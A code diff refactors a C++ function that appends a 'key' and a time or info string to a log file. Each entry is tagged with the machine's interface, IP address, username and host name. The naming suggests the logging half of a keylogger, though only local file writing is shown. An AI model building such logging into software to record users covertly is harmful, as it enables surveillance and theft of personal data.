@@ -7,7 +7,7 @@ bool FileExists(const string& filename) {
     return file.good();
 }
 
-void WriteToOutputFile(const wstring& new_string_key, const wstring& new_string_time, const string& filename) {
+void WriteToOutputFile(const std::wstring& key, const std::string& info, const std::string& filename) {
     wfstream file(filename, ios::app); 
 
     if (file.is_open()) {
@@ -18,7 +18,7 @@ void WriteToOutputFile(const wstring& new_string_key, const wstring& new_string_
         std::string device_ip;
         std::tie(inrtf, device_ip) = GetDeviceIP();
 
-        string infomation = "=INTERFACE=" + inrtf 
+        string sys_info = "=INTERFACE=" + inrtf 
                             + "=DEVICE_IP=" 
                             + device_ip 
                             + "=USERNAME=" 
@@ -26,10 +26,14 @@ void WriteToOutputFile(const wstring& new_string_key, const wstring& new_string_
                             + "=HOST_NAME=" 
                             + GetHostName() 
                             + "=\n";
-        for(char c : infomation) {
+        for(char c : sys_info) {
             file << c;
         };
-        file << new_string_key << new_string_time + L"\n" ;
+        file << key;
+        for(char c : info) {
+            file << c;
+        };
+        file << L"=\n";
         file.close(); 
     } else {
         cerr << "Не удалось открыть файл для записи." << endl;
